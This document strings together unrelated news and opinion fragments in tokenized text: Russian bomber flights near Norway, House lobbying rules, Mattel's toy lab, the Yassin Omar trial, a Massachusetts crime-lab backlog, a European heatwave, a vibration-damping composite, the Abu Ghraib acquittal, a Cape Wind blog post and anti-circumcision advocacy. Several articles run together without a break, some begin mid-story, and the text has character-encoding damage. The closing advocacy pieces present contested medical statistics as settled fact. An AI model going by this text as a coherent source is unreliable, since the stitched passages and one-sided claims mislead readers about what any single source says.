But he stressed that Russian officials had notified their Norwegian counterparts about the training missions , and promised that they would n't violate Norwegian air space .
In mid-July , Russia also sent bombers near Norway .

That proposal , which is scheduled for a vote on Thursday , would be the most far - reaching of the year ’s rule changes .
But many lawmakers dislike the idea because the ability to call on lobbyists for fund - raising is a major advantage of incumbency .
Others say they do not see the point of doing more .
“ I did n’t make any of those campaign promises , ” said Representative Michael E. Capuano , a Massachusetts Democrat who questions the bundling disclosure proposal and also opposed the extension of the so - called “ revolving door ” ban on lobbying by former members .
“ I made a career change 20 years ago to be a full - time elected official , ” Mr. Capuano said , explaining his position .
“ I am no longer qualified to be a tax attorney .
It is like saying to people , ‘ Please , come into public service , give it your all , and when you are done you are completely unqualified for anything else . ’ ”
Others grumbled that Mr. Van Hollen , whose Democratic campaign committee duns each member for contributions , was pushing a measure that would make it harder to tap the easiest sources of such money  lobbyists .
“ We have dues that we are supposed to raise of several hundred thousand dollars , and in the same breath we are informed that this is something we will have to vote for , ” Representative James P. Moran , Democrat of Virginia , said .
“ I do n’t know what we are supposed to do , except cold call all the people in the phone book in our districts . ”
Mr. Moran expects to vote for the disclosure rule because , he said , after his party campaigned on ethics reform “ we have to be holier than Caesar ’s wife . ”
Republicans cited the accusations against Mr. Murtha as evidence that the Democrats were already in breach of their own earmarks rules .

SHENZHEN , China , July 19 — Inside Mattel ’s sprawling test lab here , scores of technicians are doing their worst : setting Chicken Dance Elmo dolls on fire , wrecking Hot Wheels cars and yanking at the limbs of Dora the Explorer .
The lab workers are paid to break toys , pick apart their innards , and analyze the raw materials that go into them .
The goal is to protect young children from the serious harm that poor construction or dangerous components can bring .
But it is also to protect Mattel , the world ’s biggest toy maker , from what is increasingly viewed as the risk of doing business in China .
The recent wave of recalls and warnings from China has ignited worldwide concern about the safety of Chinese products , potentially mucking up a global system built , in large part , on outsourced manufacturing .
As a result , companies are trying urgently to figure out how to do business here , without risking their reputation , consumer trust , or customers ’ lives .
Mattel may have some of the answers .
In the 1990s , critics charged the company with running sweatshops in Asia .
Now , independent analysts , and even watchdog groups , say Mattel may be the best role model for how to operate prudently in China .
Police " almost killed " Yassin Omar in a dawn raid
Woolwich Crown Court was told officers found Yassin Omar , 26 , standing in the bath wearing what looked like a rucksack filled with explosives .
Specialist police officers threw stun grenades into every room before a violent struggle ended with his arrest .
Mr Omar and six other defendants deny charges of conspiracy to murder .
His arrest came six days after an alleged extremist Muslim plot to commit suicide bombings on the London Tube .
Twelve specialist officers armed with Heckler and Koch carbine sub-machine guns and Taser stun guns and wearing full body armour and helmets raided the house in Haybarns Road in Birmingham just after 0500 BST on 27 July .
' It was a violent struggle '
One officer said he punched Mr Omar , who was standing in the bath fully clothed , as hard as he could in the face while another repeatedly stunned him with a Taser gun .
At one point another officer had the safety catch off his sub-machine gun and was aiming his weapon at the back of Mr Omar 's head .
Identified as PC 7512 , he told the court : " In all honesty , I still do n't know to this day how I did not shoot him . "
I brought the point of my aim to the back of his head , during which time his hands disappeared towards his chest ...... I formed the opinion that I was going to have to shoot this man
Pc 7512
Mr Omar was eventually dragged out of the bathroom to the kitchen where his trousers and shirt were ripped off and the rucksack cut from his back .
The court was told how Mr Omar , of New Southgate in north London , fled London the day after the alleged attacks by disguising himself in a burkha and travelling to Birmingham by bus .
Pc 7512 said the bathroom was plunged into darkness because the light cord was wrapped round the inside door handle .
He and another officer , Pc 5566 , threw a stun grenade inside , which set off an " extremely loud bang and bright flashes " .
Relying on torches attached to their guns and helmets , the court heard they burst into the room to find Mr Omar in the bath , facing the tiled wall with the rucksack on his back .
" I had grave concerns about the rucksack on his back , " Pc 7512 told the court .
" I brought the point of my aim to the back of his head , during which time his hands disappeared towards his chest .

After much shouting , Mr Omar lifted his hands in the air for a second time and the officer replaced the safety catch .
He and Pc 5566 seized the defendant and , during a frantic struggle , tried to control his hands .
Pc 7512 said : " My concern was obviously his ability to detonate what I believed to be an explosive device so my priority was controlling his hands . "
Pc 5566 said : " Due to my inability to deploy my Taser , I had to resort to punching him as hard as I could in the face .
It is a taught technique . "
A third officer , Sergeant 5755 , used his Taser gun repeatedly .
He told the jury : " It was a really violent struggle , it was a melee . "
Mr Omar denies charges of conspiracy to murder and conspiracy to cause explosions likely to endanger life .

Local Crime lab neglected 16,000 cases Evidence was never analyzed , probe finds Evidence samples from thousands of crime scenes across Massachusetts , including nearly 1,000 homicides and other deaths and 6,500 sexual assaults , were never analyzed by the State Police crime lab , according to an investigation of the lab ordered by the state .
The lab 's failure to process potentially crucial DNA evidence from 16,000 cases means that killers and rapists could be walking free , said two law enforcement officials who have seen the report .
The backlog of samples , found in a refrigerated room at the Maynard laboratory , dates to the 1980s and is " of crisis proportions , " the report said .
The backlog is far greater than previously disclosed ; lab administrators had acknowledged a backlog of only about 2,000 cases .
The investigation also found 4,000 rape evidence kits from as far back as 1989 that were never even opened to determine whether there was biological evidence that could help prosecutors identify and charge rapists , the officials said .
The study , ordered by the state Executive Office of Public Safety in March , was conducted by Vance , an international risk management consulting firm with an office in Braintree .
In their 57 - page report , scheduled to be released tomorrow , the consultants conclude that the crime lab 's problems , " allowed to fester , led to a crisis which unnecessarily undermined public confidence in a critical law enforcement function . "
The two law enforcement officials , who spoke on condition of anonymity because the study has not been made public , briefed the Globe on the report , but declined to provide a copy .
The report also points to deficiencies that include " lack of audits or independent outside reviews , serious questions concerning the qualifications of personnel .
. . incomplete and improper documentation , and profile mistakes . "
It did not conclude that any DNA testing was conducted improperly or raise questions about any cases that have already been prosecuted .
" The degree to which this report demonstrates a disturbing lack of oversight at the crime lab during previous administrations is deeply troubling , " said one official .
" The Patrick administration has said it plans to continue its overhaul of the lab and quickly implement many of the recommendations of the report as well as aggressively address the unacceptable backlog that was created by negligent oversight . "
The Patrick administration will likely hire a private company and spend as much as $ 6 million to analyze samples from cases where the statute of limitations has not expired , said the official .
State public safety officials will also contact police departments and prosecutors to determine if there are cold cases that they may now be able to solve .
The analysis could involve thousands of cases , according to the official .
The state hired Vance to conduct a $ 267,000 top - to - bottom review of the lab 's operations after problems surfaced with the handling of evidence in the Combined DNA Index System , or CODIS , the FBI - funded computer network that serves as a national registry for DNA samples collected from convicted criminals and arrested individuals .
State crime labs compare crime scene DNA evidence to genetic profiles in the national database to try to identify suspects .
The civilian head of the crime lab resigned under pressure in March .
The administrator of the lab 's DNA database was fired in April , three months after he was suspended for allegedly mishandling CODIS test results , including 13 cases in which he did not tell law enforcement officials about positive DNA matches in unsolved sexual assault cases until after the statute of limitations had expired .
Last month , the state 's top forensics official , who supervised the crime lab and the troubled state medical examiner 's office , also resigned .
The FBI , the state Inspector General , and the State Police are also investigating the lab .
Joseph Dorant , president of the Massachusetts Organization of State Engineers and Scientists , the union that represents the laboratory workers , said backlogs of crime scene samples that are waiting to be analyzed are not unique to Massachusetts .
" The staffing at the crime lab has n't caught up to the pace of the technology , " he said .
" The Massachusetts District Attorneys Association did a report recommending that the lab hire an additional 50 chemists .
We have some of the best forensic scientists in the state .
In the last five years the state has put millions of dollars into a new crime lab and new equipment but now we need the forensic scientists to do the testing .
We have a good staff . "
In its report , Vance describes a national DNA backlog , but says the situation is much more severe at the crime lab .
According to the report , during the laboratory 's most productive year , in 2006 , it tested samples from 500 cases , up from 200 the year before .
In 2006 , the laboratory , which had an annual budget of $ 16.2 million , received a funding increase to hire additional staff .
Chemists at the lab , the report said , worked on an average of four cases a month -- about half the national average .
Joseph F. Savage Jr. , chairman of the New England Innocence Project , a nonprofit legal clinic that seeks to exonerate wrongfully convicted people through the use of DNA evidence , said the report " confirms our fears that the lab was a disaster . "
Savage , who had called for an investigation into the laboratory by the inspector general , Gregory W. Sullivan , added : " We look forward to getting the complete facts when the Inspector General completes his independent investigation . "
Testing of the yet - to - be - analyzed samples could turn up suspects in cases in which someone else has already been convicted and lead to exoneration .
Jack McCarthy , a spokesman for the inspector general , declined to comment on the Vance report or his office 's investigation .
Public safety officials hope to reorganize the lab , placing all of the state 's forensic services , including the arson and ballistics investigative units , under one director to save money and make training standards more uniform .
Among the report 's 27 recommendations , the report suggests that the state conduct a national search for a new lab director .

Forest fires have raged across Greece amid soaring temperatures
The heat was blamed for 30 deaths in Romania and several elsewhere in the region .
Farms in Serbia have seen much of this year 's harvest scorched .
The record - breaking heat has also been blamed for widespread forest fires .
Parts of northern Europe have meanwhile seen vast floods and heavy rainfall - sparking fears that climate change may be to blame for the extreme weather .
City threatened
Unusually high temperatures of more than 40C ( 104 F ) have been recorded in several parts of southern and eastern Europe .
On Monday , temperatures of 45C ( 113 F ) were recorded in Bulgaria - the hottest since records began , officials said .
Temperatures in Romania are expected to reach 41C ( 106 F ) for the second day running on Tuesday , prompting authorities to put emergency services in many areas on " red alert " .
In neighbouring Serbia , the agriculture ministry says 30 % of the country 's annual harvest has been destroyed because of the heat , with the wheat , soya and vegetable crops worst hit by the heat .
Belgrade has introduced restrictions on the export of agricultural products .
Hundreds of forest fires have been reported in Greece , where two pilots died on Monday after a water - bombing aircraft they were flying over a forest fire crashed .
Another such aircraft flying over a forest fire in Italy crashed on Monday , killing three people .
In the Former Yugoslav Republic of Macedonia , thousands of firefighters , soldiers and local people have been battling through the night to stop a forest fire from reaching the country 's second - largest city , Bitola .
According to the Associated Press news agency , the encroaching blaze ignited mines and weapons that had lain buried in the soil since World War I .

At a first glance , the association of the words " metal " and " rubber " seems to be at least illogical , if not absurd .
The material properties of natural rubber that make it an elastomer and a thermoplastic are exactly the ones engineers try to avoid by using metal .
But metal has one problem , that makes scientists turn to plastic , in an effort to make the most of each material , by combining its elasticity with the rigidity of metal .
Vibrations are a good example of this joint - venture .
They cause discomfort when using metal tools , they produce tiny cracks and dents in the metal and in the worst case scenario , they can affect the structural integrity of an entire building and could turn it into a pile of rubber .
The most widely used method of eliminating vibrations is to use some kind of suspension system that dampens them out and rubber is widely incorporated in this technology .
Other techniques , which imply counteracting vibrations by producing another set , exactly opposite to the first ones , so that they cancel each other out , can also be used , but they are cumbersome and more expensive .
A new invention may be the ideal answer to this problem : the rubbery metal .
This exotic material , developed by researchers from Virginia Polytechnic Institute and State University in Blacksburg , US , is a composite consisting of ceramic particles embedded in a metal matrix .
As the inventors claim , it makes use of the metal for the strength and stiffness and a strange property of ceramics , called ferroelasticity , which coverts vibrations into small rotations of crystals within the material .
Thus , the new composite material can offer all the positive properties of currently used metals and in the same time , the vibration - dampening properties of rubber .
Many practical applications could incorporate this new product and many industry branches could benefit from using it , in the near future .
However , since some of them are highly susceptible when it comes to changes , like the skyscraper building and aircraft engineering , we will most likely see this material in more earthly applications , like wrenches , tennis rackets and baseball bats .
At least for a while .
Tuesday ’s acquittal of Lt. Col .
Steven Jordan on charges related to the Abu Ghraib prison abuses means that no officers have been found criminally responsible for the mistreatment of prisoners at the Iraqi prison near Baghdad .
During Jordan ’s week - long court - martial hearing at Fort Meade , Md. , his lawyers argued that he was not directly responsible for training and supervising the soldiers who abused detainees at Abu Ghraib prison from mid-September to late December 2004 .
Two generals who investigated the abuses found that Jordan offered " tacit approval " for abuses committed by military police under his supervision in November 2003 , which was " the causative factor that set the stage for the abuses that followed for days afterward . "
However , the jury of nine military officers was not convinced by prosecutors or the generals ’ investigation and sided with Jordan ’s attorneys , who argued that their client was nothing more than a manager at the prison and that interrogation techniques were the responsibility of Col.
Thomas Pappas , the highest ranking officer at the prison , and Capt .
Carolyn Wood , leader of the Interrogation Command Element unit .
Jordan was found innocent of charges that he was responsible for training and supervising soldiers who had been convicted of abusing prisoners , as well as charges that he was personally involved in supervising the use of forced nudity and the use of dogs to intimidate detainees during interrogations .
He was , however , found guilty of a separate charge of disobeying an order not to speak with third parties about the investigation of abuses at Abu Ghraib .
Prosecutors have recommended that he be reprimanded and fined one month ’s pay .
" The message they are trying to send is that [ the abuse ] all stopped at the lowest level in the chain of command and that it did n’t have anything to do with command , " said Georgetown law and philosophy professor David J. Luban .
" I think that there ’s maybe a second message there as well .
It ’s a little odd that the one thing Jordan ’s been convicted of is talking about the investigation .
He refused to go along with a cover -up . "
A June 2007 Seymour Hersh article in the New Yorker contained interviews with Maj. Gen. Antonio Taguba who admitted that he had suspicions that Jordan and his subordinates were receiving directions in interrogation techniques from sources higher up in the chain of command .
Taguba , who wrote the initial 2004 report on abuses at Abu Ghraib , was reassigned and retired earlier this year .
The verdict means that no officers will be held criminally responsible for the abuses in 2003 , leaving most of the blame to fall on 11 low - ranking soldiers who appeared in a series of digital photos that showed detainees being intimidated by dogs , wearing hoods , being forced to pose naked in pyramids , and being forced to participate in sexual acts .
" This leaves a curious record in prosecutions coming out of Abu Ghraib , " wrote human rights advocate and Harper ’s magazine blogger Scott Horton .
" Accountability , it seems , is something which applies to enlisted personnel and noncommissioned officers who make the mistake of being caught in photographs .
The officers who were supposedly in charge of the facility and giving them guidance escape without serious punishment . "
This trend , Horton argues , goes all the way to the top .
" After the Abu Ghraib scandal , a commission composed of close friends of Secretary of Defense Rumsfeld and headed by former Secretary of Defense [ James ]
Schlesinger issued a report which exculpated Rumsfeld without ever interviewing him or examining any evidence of his involvement , or that of others in the office of secretary of defense , in the affair . "
Indeed , reports of similar interrogation techniques at the U.S. detention facility at Guantanamo Bay , Cuba does suggest that higher ranking officers or Defense Department officials may have authorized some , if not all , of the techniques used on prisoners .
" I ’ve talked to interrogators who said , ‘ Do n’t think Abu Ghraib was an aberration , ’ " said Luban .
Military police at Abu Ghraib ’s tier 1A , where detainees of high intelligence value were held , have stated that they were instructed on what techniques to employ on detainees by higher - ranking interrogators and civilian contractors .
A U.S. Justice Department investigation has not yet produced any charges against civilian contractors who were present at Abu Ghraib or instructing soldiers who guarded detainees .
" What the jurors said is that this guy was not in the chain of command so maybe command responsibility cannot be used against him .
But the fact that he ’s the only officer who ’s been charged I would say this is largely a whitewash , " said Luban .
" It ’s all part of this myth that what we ’re doing in the interrogation of detainees is careful and humane and if bad stuff happens it ’s bad apples at the bottom of the barrel . "
Well , if you do n't count actual former lobbyists Fred Thompson and Rudy Giuliani ...
Huffington Post :
John McCain , who made his name attacking special interests , has more lobbyists working on his staff or as advisers than any of his competitors , Republican or Democrat .
A Huffington Post examination of the campaigns of the top three presidential candidates in each party shows that lobbyists are playing key roles in both Democratic and Republican bids -- although they are far more prevalent on the GOP side .
But , all the campaigns pale in comparison to McCain's , whose rhetoric stands in sharp contrast to his conduct .
" Too often the special interest lobbyists with the fattest wallets and best access carry the day when issues of public policy are being decided , " McCain asserts on his web site , declaring that he " has fought the ' revolving door ' by which lawmakers and other influential officials leave their posts and become lobbyists for the special interests they have aided . "
In actual practice , at least two of McCain 's top advisers fit precisely the class of former elected officials he criticizes so sharply .
On March 7 , 2007 , McCain named ex-Texas Representative Tom Loeffler , who has one of the most lucrative and influential practices in the nation 's capital , as his campaign co-chair .
In the same month , McCain named former Washington Sen. Slade Gorton , now a heavyweight lobbyist , as his honorary chairman for Washington state .

While the proposed Cape Wind project has passed a couple important hurdles in recent days , it seems that it is not out of the woods yet .
The federal agency studying the proposed Cape Wind energy project says its review will take longer than expected a delay likely to push back a final decision on the project until the fall of 2008 .
The Minerals Management Service , which is crafting guidelines for offshore renewable energy projects , said Thursday that it has pushed back plans to release its environmental review from late April to sometime late this summer .
The agency told The Cape Cod Times in a statement that its review â€ was taking longer than originally expected .â€ 
Now , the agency , part of the U.S. Department of Interior , expects a final decision in the fall of 2008 , rather than April 2008 .
Mark Rodgers , a spokesman for project developer Cape Wind Associates , said Friday , â€ Cape Wind has already undergone more review than any fossil fuel or nuclear power plant in Massachusetts , and the public pays a price delaying a project that will bring cleaner air , jobs and real action on fighting global warming .â€ 
The developers had planned to secure financing for the project in the first quarter of 2008 and complete construction by the end of 2010 .
Rodgers declined to comment on how the latest delay would affect those plans .

Seriously ?
This project has been in the works for over 5 years now .
I guess I foolishly thought that with the worlds scientists warning of dire consequences if we continue to do nothing about global warming , and the fact that it has passed every environmental standard put in front of it so far , that this project would have been green lighted by the federal agencies in charge of regulating it .
This is what would happen to Ted Kennedy 's house , after a 2 meter rise in sea level , looks like he would need a boat to get home .
Want to check if your massive sea front mansion will be under water check here .
The horrific irony of it all is that if projects like this are continued to be delayed , and the American people continue to do nothing about global warming , all the rich fat cats that do n’t want to have their precious view ruined will be forced to move as the ocean swallows their homes .
Unfortunately the worlds poor will suffer much greater consequences than the rich view - panicked residence that oppose this project .
The Kennedy ’s , the oil barons , and rich socialites will simply liquidate some bonds and move some place else .
While millions of people in China , India , and the poor of America die or are displaced .
Global warming is real , its caused by humans ( specifically our burning of fossile fuels ) , its going to cause massive suffering if we do nothing , and wind energy is a very good start down the road to solving the problem .

Medical ethics , human rights and law
Circumcision is more than a medical or health issue .
Bodily integrity is recognized as a fundamental human right , basic to the autonomy of the individual and guaranteed by law .
Introduction
In the decade that followed the passage and ratification of the United Nations Convention on the Rights of the Child in 1989 there has been a proliferation of studies by legal scholars , human rights experts and bioethicists who have developed convincing arguments that medically unnecessary circumcision of non-consenting minors is a violation of accepted principles of medical ethics and human rights .
Some commentators have even raised doubts as to the legality of the procedure .
Important landmarks include essays showing that “ informed consent ” for such an intervention constitutes a “ legal and ethical conundrum ” ; that the justifications for such an operation as a prophylactic measure cannot override the ethical objections ; and that circumcision of boys is a violation of the rights of the child .
Other scholars have shown that the ethical and physical harm arguments against female genital mutilation apply just as strongly to circumcision of boys , that the physiological parallels of the two sets of procedures are very close , and that there is no justification for quarantining discussion of male circumcision from female genital mutilation ( FGM ) .
Circumcision promoters refer to the objections to circumcision on medical ethics and human rights grounds as “ nebulous ” , but these issues are really central to the whole question .
No matter how great the benefits of circumcision may be , the fact remains that the foreskin belongs to its owner as surely as his fingers , toes , ears , liver and any other organ .
The only situation where it can be ethically removed without consent is in a life - threatening emergency , or in order to address a deformity , injury or disease that has not responded to conservative treatments after reasonable efforts .
The fact is that even if all the benefits of circumcision claimed by its promoters were true , it would only amount to a case that might persuade a cautious adult to elect the procedure for himself .
The case was never sufficient to justify doing it to children without consent .
Individuals are entitled to make their own choices about how they manage their health , and should not be deprived of normal body parts merely because somebody else thinks they would be better off without them .
The reason circumcision promoters insist that ALL boys be circumcised at birth is not because it is less painful or less harmful at that time – on the contrary , the evidence runs quite the other way – but because babies lack the power to resist , and if everybody is circumcised they will regard the condition as normal and never know what they are missing when they grow up .
If the benefits of circumcision were as great as its promoters claim , and if it is indeed a biomedical imperative for the 21st century ( as one keen circumciser has claimed ) , you would expect adults to be convinced by the argument and to be queuing up to get it done .
The fact that this does not happen ( except in the exceptional case of certain African countries awash with American cash ) , and the vast majority of adult men prefer to hang on to their foreskin , is in itself a sufficient reason not to impose the cut on innocent children .
Personal preference the key issue
According to a standard textbook on medical ethics , the basic principles of modern bioethics are summed up under the headings beneficence ( the good of the patient ) ; non-maleficence ( not harming the patient in any way ) ; autonomy ( respecting the patient ’s individuality and dignity as a human being ) ; and justice ( treating the patient in the same way as others with respect to his condition ) . [ 1 ]
On the basis of second two of these principles , doctors should respect the wishes of the boy on such an intimate matter as circumcision ; and should not treat him differently from the way in which they would treat girls if parents brought in their daughter and asked that she be circumcised .
The principle of autonomy was recognised in 1996 when the Australasian Association of Paediatric Surgeons agreed that the key issue to consider when faced with parental requests for circumcision of a minor was the likely future preferences of the boy : it was “ opposed to male children being subjected to a procedure , which had they been old enough to consider the advantages and disadvantages , may well have opted to reject the operation and retain their prepuce . ”
In 1999 BJU International published an analysis of a survey which showed that hundreds of men in the United States had experienced moderate to severe physical and psychological injury as a consequence of their “ routine ” circumcision as infants . [ 2 ]
Circumcised boys are more likely to feel mutilated and deprived if they grow up among peers who have not been circumcised , but both the BJU study and a more recent Australian survey show that even when they grow up among predominantly circumcised age - mates , many circumcised men can still feel humiliated and resentful . [ 3 ]
Unfortunately , this intelligence seems to be taking a long time to reach certain members of the Australian medical profession .
In February 2010 a doctor in New South Wales , commenting on a ( dubious ) report that the incidence of circumcision in Queensland was rising , stated that circumcision was generally safe but that there were still slight risks of infection of deformity of the penis .
He added that “ full informed consent was important ” , but he seems to have been unaware that minors cannot give consent .
What business did he have to be encouraging the practice ( the only possible effect of his remarks ) when the policy of the RACP is that there is no medical indication for routine circumcision of normal male infants ?
If there is no medical indication , it is a non-therapeutic procedure and should not be performed on a minor . [ 4 ]
This reference to “ risk ” indicates a serious misunderstanding of the rules for non-therapeutic surgery .
We often hear arguments that circumcision is justified or not justified on the basis that the benefits exceed the risks of the surgery or that the risks of surgery exceed the benefits .
But the risk / benefit rule was devised for therapeutic procedures , where there is a pathological condition that requires treatment .
In the case of normal male infants and boys , there is no pathology to treat , meaning that circumcision is a non-therapeutic procedure and hence is governed by far stricter rules .
According to the judgement of the High Court in Marion ’s Case , non-therapeutic procedures carried out on children are unlawful unless approved by the Family Court .
This rule has been applied when parents have sought sterilisation of mentally impaired girls , and many legal scholars and authorities on medical ethics have argued that it should also be applied to circumcision of healthy boys . [ 5 ]
Gender justice
A striking indication as to the anomalous status of circumcision is that the criminal code in most States imposes severe penalties for the performance of any cutting of the female genitals , no matter how mild , and is completely silent about the cutting of the male genitals , no matter how severe .
Yet it has been argued that most instances of female genital mutilation are less damaging than many instances of male circumcision ; that female circumcision also offers health benefits ; and that arguments based on bodily integrity and human rights must apply as much to males as to females .
Australia ’s obligations under the Sex Discrimination Act 1984 and as a signatory to the Convention on the Rights of the Child require the national and state governments to treat males and females equally and without discrimination on the basis of sex , and to take action to eradicate traditional practices harmful to children .
Article 24 ( 3 ) of the Convention requires parties to take “ all effective and appropriate measures with a view to abolishing traditional practices prejudicial to the health of children . ”
In the wake of this development several states passed laws to prohibit any form of female circumcision , and the Commonwealth specifically excluded such procedures from the Medical Benefits Schedule .
Although there was nothing in the wording of the Convention to suggest that it did not include male children , no action has yet been taken to protect them .
Although the Medicare guidelines state that payments are not available for cosmetic or clinically unnecessary procedures , a rebate for circumcision is still provided , thus subsidising and encouraging the procedure and sending a signal that it is socially and ethically acceptable .
This failure to take any action to protect boys is increasingly recognised as constituting , as a recent article in the Australian Journal of Human Rights argued , “ a hidden human rights violation ” .

Circumcision violates child ’s right to an open future
A paper in the Journal of Medical Ethics ( on - line first , January 2013 ) argues that non-therapeutic circumcision ( is ethically objectionable and legally borderline because it violates a child ’s right to an open future .
This principle is widely accepted in ethical and legal circles and has often been applied to limit the power of parents to indoctrinate children into particular political beliefs or cultural identities .
It has less often been applied to bodies rather than minds , and never previously to permanent bodily alterations such as circumcision .
In this paper , the author ( Dr Robert Darby ) elucidates the open future principle and consider whether it is applicable to non-therapeutic circumcision of boys , whether performed for cultural / religious or for prophylactic / health reasons .
He argues that the principle is highly applicable to non-therapeutic circumcision ( NTC ) , and concludes that NTC would be a violation of the child ’s right to an open future , and thus objectionable from both an ethical and a human rights perspective .
Dr Darby suggests that NTC is similar to designer deafness ( i.e. causing a child to suffer hearing loss ) because it also results is sensory deprivation , and also that circumcision is comparable to smoking , in that it is really a bad habit that causes long term harm to the body .
Preventing a child from smoking and protecting his foreskin have the same rationale : to preserve the body for future use and ensure that the future adult is able to make autonomous decisions about such intimate personal matters .
ABSTRACT
The principle of the child ’s right to an open future was first proposed by the legal philosopher Joel Feinberg and developed further by bioethicist Dena Davis .
The principle holds that children possess a unique class of rights called rights in trust – rights that they cannot yet exercise , but which they will be able to exercise when they reach maturity .
Parents should not , therefore , take actions that permanently foreclose on or pre-empt the future options of their children , but leave them the greatest possible scope for exercising personal life choices in adulthood .
Davis particularly applies the principle to genetic counselling , arguing that parents should not take deliberate steps to create physically abnormal children , and to religion , arguing that while parents are entitled to bring their children up in accordance with their own values , they are not entitled to inflict physical or mental harm , neither by omission nor commission .
In this paper I aim to elucidate the open future principle and consider whether it is applicable to non-therapeutic circumcision of boys , whether performed for cultural / religious or for prophylactic / health reasons .
I argue that the principle is highly applicable to non-therapeutic circumcision , and conclude that NTC would be a violation of the child ’s right to an open future , and thus objectionable from both an ethical and a human rights perspective .
The paper concludes :
The child ’s right to an open future complements the four principles of bioethics developed by Beauchamp and Childress by meeting the objection that children cannot possess rights because they lack moral autonomy and the capacity to make rational choices .
Children may lack such autonomy now , but as adults - to - be they will develop such autonomy in the normal course of their growth .
It also supports and extends the argument of Hodges et al that additional scrutiny is demanded when we make decisions about non-essential surgery on children , especially when it entails removal of functional body parts .
One of the compelling features of the principle is its alignment with John Locke ’s proposition that parental authority derives from their duty of care towards their children and is limited by the interests of the latter .
Circumcision is analogous to smoking , eating junk food and not cleaning one ’s teeth because it causes long term harm to the body and reduces its future functionality .
Forcing children to brush their teeth or endure painful vaccinations , preventing them from smoking and protecting their foreskin all have the same rationale : to preserve the body for future use and ensure that the future adult is able to make autonomous decisions about such matters .
The open future principle both constrains parents and gives them authority – constrains them from cutting off their children ’s future options , but gives them the authority to prevent their children from recklessly doing the same .

Arguments against circumcision of boys
by Gert van Dijk
Recently an article appeared in KN [ Catholic News , Amsterdam ] by Rabbi Lody van de Kamp , who hauls me over the coals [ literally “ breaks the staff ” ] about the fact that the policy of the Royal Dutch Medical Association ( KNMG ) is to discourage non-therapeutic circumcision of boys .
Yet the reasons for such discouragement are clear .
Circumcision of boys may be performed only by physicians when there are medical benefits attributed .
Circumcision without medical need is contrary to the cardinal rule for doctors “ in the first place , do no harm ” and to the rule that children who are not able to decide for themselves should be treated only when it is medically necessary .
That is the premise of the KNMG , the organization of and for physicians .
Destructiveness
The International Convention on the Rights of the Child ( ICRC ) says that the government is required to ensure that harmful traditional practices be abolished .
The science is undeniable that circumcision is harmful .
A circumcision means 25 to 50 percent of the healthy tissue of the penis is removed .
An adult man ’s foreskin has about the surface area of a postcard .
The operation is not is not a “ simple snip ” : doctors are often confronted with complications of circumcision .
Immediately after the operation , an infection or bleeding occurs in two to five percent of the boys , which sometimes requires hospitalization .
Many boys ( up to twenty percent ) later get a stricture of the urethra , causing problems with urination and possibly bladder problems .
Still later circumcised men and their partners get sexual problems more often than non-circumcised men , because a circumcised penis is less sensitive .
Also , many men complain about the fact that they were circumcised without their consent .
Any medical benefits - such as a possible reduced risk of HIV transmission [ in unprotected heterosexual intercourse ] - are relevant at a later age and are no justification for circumcision in childhood .
Discriminatory
The ICRC also says that there may not be discrimination between boys and girls .
It is noteworthy that in the Netherlands all forms of female circumcision are forbidden - even in symbolic form , with no tissue being removed - but that circumcision of boys is tolerated .
Why is it that Jewish and Muslim boys are not equally protected by law as girls ?
Religious freedom or physical integrity ?
The debate about circumcision of boys is often presented as a conflict between the right of the child to physical integrity and the right of parents to religious freedom .
What is often forgotten is that the ICRC also guarantees the child ’s right to his own freedom of religion .
This freedom implies that it is permissible for a child to be educated in religion , but also that the child should keep the freedom to choose a different opinion later .
This means that the child should remain protected from irreversible physical alterations .
A German court recently ruled that the right to religious freedom of parents is limited by the child ’s right to physical integrity .
This legal ruling fits into a debate about circumcision of boys being conducted in almost the entire Western world , even within religious groups .
In Israel , a growing group of parents refrain from circumcising .
Social pressure
Many parents who still perform circumcision do so because of social pressure from their parents and grandparents , not from religious feelings .
In America , a growing number of Jewish parents , together with religious leaders , have developed alternative rituals in which the child can be included in the religious community , but without violating the integrity of the child 's body .
Growing resistance
The growing resistance to circumcision of boys comes not only from the medical profession and secular society , but also from religious communities themselves .
The debate has nothing to do with anti-semitism or anti-religion , as is sometimes suggested .
It is a manifestation of a growing awareness that children have the same fundamental rights as adults .
If it is not permissible for a man to be circumcised against his will , why is it permissible to do the same to a child ?
Personal choice
Circumcision is a personal choice for which people have different reasons .
Fortunately we live in a country where people are free to make that choice .
But let it be a choice that the person makes for himself , because ultimately there is only one person who should decide whether or not to remove a healthy part of the body , and that is the man himself .

Non-therapeutic circumcision violates rights of the child - Slovenian Ombudsman
Varuh clovekovih pravic RS ( [ edited ] Google translation ) , February 2012
Circumcision of boys for non-medical reasons is a violation of children 's rights ( Obrezovanje fantkov iz nemedicinskih razlogov je kršitev otrokovih pravic )
A complainant asked the Ombudsman to assess whether circumcision of boys is interference with the rights of the child , especially if it is done only for religious reasons and is not justified on health grounds .
The complainant considered that [ such ] interference [ by ] the Slovenian doctors is harmful but he does not know all the negative consequences [ of prejudice ] ( subconscious trauma , impotence , infection , etc .. ) .
Before preparing the opinion , we examined available scientific literature on the issues , [ especially ] the article by Damian Korošec , published in the magazine Lawyer , Volume 50 ( 1995 ) entitled [ Circumcision - pointless ] banality of surgery .
Inquiries were sent to the College of Experts on General Surgery , the National Medical Ethics Commission of the Slovenian Republic and the Health Insurance Institute of Slovenia .
... Expanded expert committee for surgery ... sen[t ] us the conclusion that the circumcision of boys for non-medical reasons is not medically justified .
Indications for professional intervention are listed in the professional urological literature .
The Office of the Commission for Medical Ethics has sent us a long answer , which we summarize in its opinion of principle : " ritual circumcision of boys for religious reasons in our country , [ for ] legal and ethical reasons is unacceptable , and doctors should not perform it . " ...
The Health Insurance Institute of Slovenia [ w ] as asked for information concerning payment [ for ] circumcision ( annual number of interventions , the price of services ) and how the issue of payment is arranged , if medical intervention is not indicated , but is carried out only at the request of the individual or his legal representatives .
The Institute replied [ to us ] that [ they have ] no information on the annual number of interventions ; the delivery price that society pays health care providers is € 34.88 .
When intervention is not medically indicated , service is not covered by the compulsory health insurance , so [ it is for ] the patient or his agents to pay [ for ] the intervention .
... [ We ] decided to examine the situation with regard to some important issues of human rights and especially children 's rights .
The United Nations Convention on the Rights of the Child obliges States Parties to take all appropriate legislative , administrative , social and educational measures to protect the child from all forms of physical or mental violence , injury and abuse , while in the care of parents , legal guardians or any other person who care for him ( article 19 CRC ) .
The Constitution of the Republic of Slovenia in the 56th Article [ grants the ] child special protection and care [ under ] the 35 [ th ] Article as everyone is guaranteed the inviolability of physical and mental integrity .
These provisions clearly show that any intervention in the physical integrity of children is limited and justifiable only for medical reasons .
